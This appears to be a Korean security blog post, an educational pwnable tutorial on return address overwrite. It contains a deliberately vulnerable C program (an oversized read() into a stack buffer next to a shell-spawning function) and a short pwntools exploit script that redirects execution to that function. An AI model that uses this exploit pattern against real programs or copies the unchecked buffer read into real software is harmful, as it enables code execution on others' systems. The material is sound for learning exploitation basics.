@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE]Return Address Overwrite · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다. Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-return-address-overwrite/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-return-address-overwrite/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-return-address-overwrite/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE]Return Address Overwrite · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다. Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다."><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-return-address-overwrite/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE]Return Address Overwrite","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다. Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다.","datePublished":"2023-09-18","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-return-address-overwrite/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-return-address-overwrite/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE]Return Address Overwrite</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다. Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다.</p><div class="article-meta"><time datetime="2023-09-18">2023년 9월 18일</time><span>·</span><span>2 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.</strong> <strong>※</strong> </p>
+<p>저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다.</p>
+<p>이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/001.png" alt=""></p>
+<p>Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다.</p>
+<p>만약, buf에 데이터 입력하는데 buf보다 더 큰 크기의 데이터를 입력하면 어떻게 될까??</p>
+<p>별다른 검증이 없는 프로그램인 이상 sfp와 ret 영역까지 침범하여 입력이 가능해진다.</p>
+<p>이런 흐름으로 이뤄지는 공격이 <strong>Return Address Overwrite</strong>이다.</p>
+<p>간단한 예제를 하나 생성하여 실습해보겠다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void getshell(){
+    execve(&quot;/bin/sh&quot;,0,0);
+}
+
+int main(){
+    int buf[0x30];
+    
+    printf(&quot;Input : &quot;);
+    read(0,buf,0x100);
+
+    return 0;
+}
+</code></pre>
+<p>위 코드는 main()에서 read()를 통해 값을 입력하는 기능만을 수행한다.</p>
+<p>이때 주의해서 봐야하는 부분은 2개가 존재한다.</p>
+<p>1. 셸을 실행할 수 있는 getshell()이라는 함수가 존재한다.</p>
+<p>2. main()을 보면 buf배열의 선언된 0x30보다 더 큰 값을 입력할 수 있다.</p>
+<pre><code>int buf[0x30];
+read(0,buf,0x100);
+</code></pre>
+<p>위의 코드를 보통 'BOF 취약점이다’라고 한다.</p>
+<p>이제 위 코드를 통하여 실습을 진행하겠다.</p>
+<p>먼저 buf의 크기를 확인해야한다. </p>
+<p>코드만 보았을 때 일반적으로 0x30이다라고 생각할 수도 있는데,</p>
+<p>buf라는 배열은 char이 아닌 int 자료형을 통해 생성이 되었다.</p>
+<p>때문에 0x30이 아닌 4 * 0x30한 결과인 0xc0이 buf의 크기가 된다. </p>
+<p>이렇게 코드를 통해 계산하는 것도 방법이지만 우리는 시스템을 공부하는 입장이니 gdb를 통해 다시 확인하겠다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/002.png" alt=""></p>
+<p>우선 main()에서 Stack Frame을 생성하는 부분이다,</p>
+<p>우리는 이미 buf의 크기를 알기 때문에 해당 부분이 buf의 크기/위치이다라고 생각할 수 있다.</p>
+<p>그래도 우리는 한번 더 확인을 해주어야 한다.</p>
+<p>해당 예제는 변수가 1개이고 Stack 보호기법 중 하나인 Canary가 설정되어 있거나</p>
+<p>Stack 정렬을 해줄 필요가 없는 것이기 때문에 Stack Frame과 buf가 일치하겠지만,</p>
+<p>그렇지 않은 경우가 더 많기 떄문이다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/003.png" alt=""></p>
+<p>read()가 호출된 부분을 통해 확인한 결과 buf는 역시 [rbp-0xc0]이다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/004.png" alt=""></p>
+<p>Stack Frame을 정리하면 위와 같다.</p>
+<p>다시 취약점을 살펴보면 buf의 크기인 0xc0보다 큰 0x100 크기의 데이터까지 read()를 통해 입력받는다.</p>
+<p>sfp와 ret를 포함한 Stack Frame의 전체 크기는 0xd0이기 때문에 ret부분까지 덮어 씌우는 공격이 가능하다.</p>
+<p>이제 어느 함수로 ret할지를 찾으면 되는데 우리는 이미 답을 알고 있다.</p>
+<p>셸을 실행시키는 getshell()이라는 함수가 있기 때문이다.</p>
+<p>해당 함수의 주소는 gdb를 통해서 확인이 가능하다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/005.png" alt=""></p>
+<p>공격 절차를 정리하면 다음과 같다.</p>
+<p>1. buf의 크기 파악</p>
+<p>2. getshell()의 주소 확인</p>
+<p>3. buf + sfp + ret(getshell함수)를 전송</p>
+<p>4. 공격 성공</p>
+<pre><code>from pwn import*
+
+p = process('./return')
+e = ELF('./return')
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xc0
+payload += b'b'*0x8 
+payload += p64(getshell)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>위의 페이로드를 실행하면 정상적으로 공격이 수행된 것을 확인할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/006.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-return-address-overwrite/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
